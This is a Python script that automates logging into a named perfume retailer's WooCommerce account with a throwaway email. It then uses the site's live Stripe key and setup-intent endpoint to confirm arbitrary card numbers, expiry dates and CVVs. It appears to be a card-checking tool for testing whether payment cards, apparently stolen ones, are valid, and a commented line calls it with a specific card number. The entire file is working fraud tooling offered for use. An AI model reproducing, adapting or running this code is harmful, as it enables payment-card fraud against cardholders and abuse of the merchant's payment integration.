import requests
import base64
import json


class StripeAuth:

    def __init__(self):
        self.Site_Api = "https://www.joyprofumerie.com/area-personale/"
        self.Site_Api_1 = (
            "https://www.joyprofumerie.com/area-personale/add-payment-method/"
        )
        self.Config_Api = "https://www.joyprofumerie.com/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent"
        self.session = requests.Session()

    def _post_request_site(self):
        headers1 = {
            "Host": "www.joyprofumerie.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Priority": "u=0, i",
            "Te": "trailers",
        }
        site_res = self.session.get(self.Site_Api, headers=headers1)

        nonce = self.extract_value(
            site_res.text,
            '<input type="hidden" id="woocommerce-login-nonce" name="woocommerce-login-nonce" value="',
            '" />',
        )
        #print(nonce)
        headers = {
            "Host": "www.joyprofumerie.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "216",
            "Origin": "https://www.joyprofumerie.com",
            "Referer": "https://www.joyprofumerie.com/area-personale/",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Priority": "u=0, i",
            "Te": "trailers",
        }
        payload = f"username=yinir50511%40ahaks.com&password=yinir50511%40ahaks.com&woocommerce-login-nonce={nonce}&_wp_http_referer=%2Farea-personale%2F&login=Accedi&redirect=https%3A%2F%2Fwww.joyprofumerie.com%2Farea-personale%2F"
        payload_res = self.session.post(self.Site_Api, headers=headers, data=payload)
        #print(payload_res.status_code)

        site_nonce_rs = self.session.get(self.Site_Api_1, headers=headers1)
        #print(site_nonce_rs.text)

        nonce1 = self.extract_value(site_nonce_rs.text, '"rest_nonce":"', '",')
        #print(nonce1)

        headers = {
            "Host": "www.joyprofumerie.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Length": "44",
            "Origin": "https://www.joyprofumerie.com",
            "Referer": "https://www.joyprofumerie.com/area-personale/add-payment-method/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Te": "trailers",
        }

        Config_payload = f"payment_method=stripe_cc&_wpnonce={nonce1}"

        Config_Rq = self.session.post(
            self.Config_Api, headers=headers, data=Config_payload
        )
        #print(Config_Rq.json())

        seti = Config_Rq.json()["intent"]["id"]
        secret = Config_Rq.json()["intent"]["client_secret"]

        return seti, secret

    def _Post_GraphQL_Api(self, card_number, exp_month, exp_year, cvv):
        seti, secret = self._post_request_site()
        #print(seti, secret)
        headers = {
            "Host": "api.stripe.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://js.stripe.com/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "4333",
            "Origin": "https://js.stripe.com",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Priority": "u=4",
            "Te": "trailers",
        }
        playload = f"payment_method_data[type]=card&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[referrer]=https%3A%2F%2Fwww.joyprofumerie.com&payment_method_data[time_on_page]=11150&expected_payment_method_type=card&_stripe_account=acct_1MZZEAKmA9CJ3XpX&client_secret={secret}&use_stripe_sdk=true&key=pk_live_51MZZEAKmA9CJ3XpXjG9pwlXBwArk4kV2ymGE9n0PdT9EKFrrKkU37HELRZpzZD5pQciMrTXZJe8hc2zD7pO3ZKTv001SKuIrNY"
        response = self.session.post(
            f"https://api.stripe.com/v1/setup_intents/{seti}/confirm",
            headers=headers,
            data=playload
        )
        try:
            data = response.json()
            print(data)
        except Exception as err:
            print(err)
            print(response.text)
            return None

    @staticmethod
    def extract_value(source, left, right):
        """Extract value from the source based on delimiters"""
        try:
            start = source.index(left) + len(left)
            end = source.index(right, start)
            return source[start:end]
        except ValueError:
            return None


#R1 = StripeAuth()
#R1._Post_GraphQL_Api("4403933605654935", "10", "26", "223")
